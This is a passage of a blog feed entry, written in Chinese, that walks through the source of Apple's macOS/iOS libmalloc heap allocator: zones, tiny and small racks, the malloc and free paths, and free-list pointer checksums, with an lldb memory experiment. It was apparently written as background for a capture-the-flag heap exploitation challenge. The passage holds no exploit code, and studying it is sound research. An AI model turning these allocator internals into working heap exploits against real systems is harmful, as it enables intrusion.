type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* 